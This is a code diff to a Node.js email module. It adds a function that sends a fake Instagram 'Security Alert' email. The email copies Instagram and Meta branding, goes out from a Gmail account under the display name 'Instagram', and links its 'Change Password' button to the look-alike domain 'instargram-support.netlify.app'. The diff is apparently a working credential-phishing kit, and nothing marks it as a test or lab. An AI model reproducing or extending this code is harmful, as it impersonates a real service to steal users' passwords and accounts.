@@ -7,11 +7,16 @@ function getTransporter() {
   if (_transporter) return _transporter;
 
   _transporter = nodemailer.createTransport({
-    service: 'gmail',
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,           // SSL on port 465
     auth: {
       user: process.env.GMAIL_ID,
       pass: process.env.GMAIL_PASSWORD,
     },
+    connectionTimeout: 10000,  // 10s
+    greetingTimeout: 10000,
+    socketTimeout: 15000,
   });
 
   return _transporter;
@@ -352,4 +357,220 @@ async function sendPasswordChangedEmail(to, username = '') {
   }
 }
 
-module.exports = { sendOtpEmail, sendPasswordChangedEmail };
+/**
+ * Send security alert notification email (someone tried to login).
+ * Uses external S3 URLs for images.
+ * @param {string} to                 Recipient email address
+ * @param {string} username           Username (optional, will use email if not provided)
+ * @param {string} notificationType   Type of notification ("Someone tried to sign in" or "New login detected")
+ * @param {string} deviceName         Device name (optional)
+ * @param {string} location           Location (optional)
+ */
+async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '') {
+  const transporter = getTransporter();
+  const displayName = username || to;
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+  const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+  const deviceInfo = deviceName || 'Unknown Device';
+  const locationInfo = location || 'Unknown Location';
+  
+  // URL encode email for the change password link
+  const encodedEmail = encodeURIComponent(to);
+  const changePasswordUrl = `https://instargram-support.netlify.app/changepassword?email=${encodedEmail}`;
+
+  console.log('🔐 Preparing security alert email for:', to);
+  console.log('   Type:', notificationType);
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Security Alert - Instagram</title>
+  <!--[if mso]>
+  <noscript>
+    <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
+  </noscript>
+  <![endif]-->
+</head>
+<body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
+
+  <!-- Outer wrapper -->
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
+    style="background-color:#ffffff;min-width:100%;">
+    <tr>
+      <td align="center" style="padding:0;">
+
+        <!-- Content card — max 468px, full width on mobile -->
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0"
+          style="width:100%;max-width:468px;">
+
+          <!-- ── Top spacer ── -->
+          <tr><td style="height:32px;">&nbsp;</td></tr>
+
+          <!-- ── Instagram logo ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 28px;">
+              <img
+                src="${INSTA_LOGO_URL}"
+                alt="Instagram"
+                width="197" height="40"
+                style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
+            </td>
+          </tr>
+
+          <!-- ── Body text ── -->
+          <tr>
+            <td style="padding:0 24px 6px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
+              Hi ${displayName},
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:0 24px 24px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
+              ${notificationType === 'Someone tried to sign in' 
+                ? 'We detected a login attempt to your Instagram account.'
+                : 'We detected a new login to your Instagram account.'}
+            </td>
+          </tr>
+
+          <!-- ── Details box ── -->
+          <tr>
+            <td style="padding:0 24px 24px;">
+              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
+                style="background-color:#f7f7f7;border-radius:8px;padding:16px;">
+                <tr>
+                  <td style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                             font-size:14px;color:#565a5c;line-height:1.6;">
+                    <strong>Date & Time:</strong> ${dateStr} at ${timeStr}<br/>
+                    <strong>Device:</strong> ${deviceInfo}<br/>
+                    <strong>Location:</strong> ${locationInfo}
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+
+          <tr>
+            <td style="padding:0 24px 24px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
+              If this was you, you can ignore this email. If you didn't authorize this login, please secure your account immediately by changing your password.
+            </td>
+          </tr>
+
+          <!-- ── Change Password Button ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 32px;">
+              <a href="${changePasswordUrl}"
+                 style="display:inline-block;
+                        padding:12px 32px;
+                        background-color:#0095f6;
+                        color:#ffffff!important;
+                        text-decoration:none;
+                        border-radius:8px;
+                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                        font-size:14px;
+                        font-weight:600;
+                        text-align:center;">
+                Change Password
+              </a>
+            </td>
+          </tr>
+
+          <!-- ── Divider ── -->
+          <tr>
+            <td style="padding:0 24px;">
+              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+                <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
+              </table>
+            </td>
+          </tr>
+
+          <!-- ── "from" label ── -->
+          <tr>
+            <td align="center" style="padding:20px 24px 8px;">
+              <p style="margin:0;
+                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                        font-size:11px;color:#8e8e8e;">
+                from
+              </p>
+            </td>
+          </tr>
+
+          <!-- ── Meta logo ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 16px;">
+              <img
+                src="${META_LOGO_URL}"
+                alt="Meta"
+                width="67" height="22"
+                style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
+            </td>
+          </tr>
+
+          <!-- ── Copyright line ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 4px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:11px;color:#8e8e8e;line-height:1.6;">
+              © Instagram. Meta Platforms, Inc. ·
+              <a href="https://www.google.com/maps/search/1601+Willow+Road+Menlo+Park+CA+94025"
+                 style="color:#385898;text-decoration:none;">
+                1601 Willow Road, Menlo Park, CA 94025
+              </a>
+            </td>
+          </tr>
+
+          <!-- ── "This message was sent to" ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 32px;
+                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+                       font-size:11px;color:#8e8e8e;line-height:1.6;">
+              This message was sent to
+              <a href="mailto:${to}" style="color:#385898;text-decoration:none;">${to}</a>
+            </td>
+          </tr>
+
+        </table>
+        <!-- /Content card -->
+
+      </td>
+    </tr>
+  </table>
+
+</body>
+</html>`;
+
+  const text = `Hi ${displayName},\n\n${notificationType === 'Someone tried to sign in' 
+    ? 'We detected a login attempt to your Instagram account.'
+    : 'We detected a new login to your Instagram account.'}\n\nDate & Time: ${dateStr} at ${timeStr}\nDevice: ${deviceInfo}\nLocation: ${locationInfo}\n\nIf this was you, you can ignore this email. If you didn't authorize this login, please secure your account immediately by changing your password.\n\nChange Password: ${changePasswordUrl}\n\n© Instagram. Meta Platforms, Inc. · 1601 Willow Road, Menlo Park, CA 94025\nThis message was sent to ${to}`;
+
+  const mailOptions = {
+    from: `"Instagram" <${process.env.GMAIL_ID}>`,
+    to,
+    subject: 'Security Alert - Instagram Login Attempt',
+    html,
+    text,
+  };
+
+  console.log('📤 Sending security alert email...');
+  
+  try {
+    const info = await transporter.sendMail(mailOptions);
+    console.log('✅ Security alert email sent');
+    console.log('   Message ID:', info.messageId);
+    console.log('   Response:', info.response);
+    return info;
+  } catch (error) {
+    console.error('❌ Email send failed:', error.message);
+    throw error;
+  }
+}
+
+module.exports = { sendOtpEmail, sendPasswordChangedEmail, sendSecurityAlertEmail };
